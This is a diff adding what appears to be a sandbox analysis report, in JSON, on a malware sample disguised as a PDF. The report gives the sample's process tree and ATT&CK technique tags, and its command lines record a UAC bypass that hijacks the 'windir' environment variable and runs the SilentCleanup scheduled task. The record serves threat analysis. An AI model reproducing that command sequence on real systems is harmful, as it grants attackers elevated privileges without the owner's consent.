@@ -1,0 +1,160 @@
+{
+ "Name": "PI20200206AP_VALBRUNA_-7563567356_pdf.exe",
+ "Md5": "788e9b35c1a1b935c9462f141d8f69ff",
+ "UUID": "eecf5e86-670f-467e-a335-b29d1f3531b7",
+ "Processes": [
+  {
+   "OID": "5ef4c1647ef2731670bf68bd",
+   "ProcessID": 2232,
+   "ParentPID": 328,
+   "CommandLine": "\"C:\\Users\\admin\\AppData\\Local\\Temp\\PI20200206AP_VALBRUNA_-7563567356_pdf.exe\" ",
+   "Image": "C:\\Users\\admin\\AppData\\Local\\Temp\\PI20200206AP_VALBRUNA_-7563567356_pdf.exe",
+   "ProcessType": "Main process",
+   "CreationTimestamp": 1593098595975
+  },
+  {
+   "OID": "5ef4c1817ef2731670bfa4ea",
+   "ProcessID": 2732,
+   "ParentPID": 2232,
+   "CommandLine": "\"C:\\Windows\\System32\\TapiUnattend.exe\"",
+   "Image": "C:\\Windows\\System32\\TapiUnattend.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1593098624711
+  },
+  {
+   "OID": "5ef4c1817ef2731670bfa4eb",
+   "ProcessID": 2204,
+   "ParentPID": 2732,
+   "CommandLine": "cmd /c C:\\Users\\Public\\Natso.bat",
+   "Image": "C:\\Windows\\System32\\cmd.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1593098624783
+  },
+  {
+   "OID": "5ef4c1817ef2731670bfa4ed",
+   "ProcessID": 2564,
+   "ParentPID": 2204,
+   "CommandLine": "reg  delete hkcu\\Environment /v windir /f ",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1593098624876
+  },
+  {
+   "OID": "5ef4c1817ef2731670bfa4ee",
+   "ProcessID": 2884,
+   "ParentPID": 2232,
+   "CommandLine": "C:\\Windows\\System32\\TapiUnattend.exe",
+   "Image": "C:\\Windows\\System32\\TapiUnattend.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1593098624935
+  },
+  {
+   "OID": "5ef4c1817ef2731670bfa4ef",
+   "ProcessID": 2904,
+   "ParentPID": 2204,
+   "CommandLine": "reg  add hkcu\\Environment /v windir /d \"cmd /c start /min  C:\\Users\\Public\\x.bat reg  delete hkcu\\Environment /v windir /f \u0026\u0026 REM \"",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1593098624937
+  },
+  {
+   "OID": "5ef4c1817ef2731670bfa4f0",
+   "ProcessID": 2240,
+   "ParentPID": 2204,
+   "CommandLine": "schtasks  /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I",
+   "Image": "C:\\Windows\\system32\\schtasks.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1593098625023
+  },
+  {
+   "OID": "5ef4c1817ef2731670bfa4f1",
+   "ProcessID": 2208,
+   "ParentPID": 2204,
+   "CommandLine": "reg  delete hkcu\\Environment /v windir /f ",
+   "Image": "C:\\Windows\\system32\\reg.exe",
+   "ProcessType": "Child process",
+   "CreationTimestamp": 1593098625106
+  }
+ ],
+ "Incidents": [
+  {
+   "ProcessOID": "5ef4c1817ef2731670bfa4f0",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5ef4c1817ef2731670bfa4ee",
+   "ThreatLevel": 2,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ef4c1817ef2731670bfa4eb",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1053"
+   ]
+  },
+  {
+   "ProcessOID": "5ef4c1817ef2731670bfa4eb",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1112",
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5ef4c1817ef2731670bfa4ea",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1059"
+   ]
+  },
+  {
+   "ProcessOID": "5ef4c1647ef2731670bf68bd",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ef4c1647ef2731670bf68bd",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1060"
+   ]
+  },
+  {
+   "ProcessOID": "5ef4c1647ef2731670bf68bd",
+   "ThreatLevel": 1,
+   "MitreAttacks": []
+  },
+  {
+   "ProcessOID": "5ef4c1647ef2731670bf68bd",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1130"
+   ]
+  },
+  {
+   "ProcessOID": "5ef4c1647ef2731670bf68bd",
+   "ThreatLevel": 2,
+   "MitreAttacks": [
+    "T1130"
+   ]
+  },
+  {
+   "ProcessOID": "5ef4c1647ef2731670bf61ed",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  },
+  {
+   "ProcessOID": "5ef4c1647ef2731670bf68bd",
+   "ThreatLevel": 1,
+   "MitreAttacks": [
+    "T1012"
+   ]
+  }
+ ]
+}
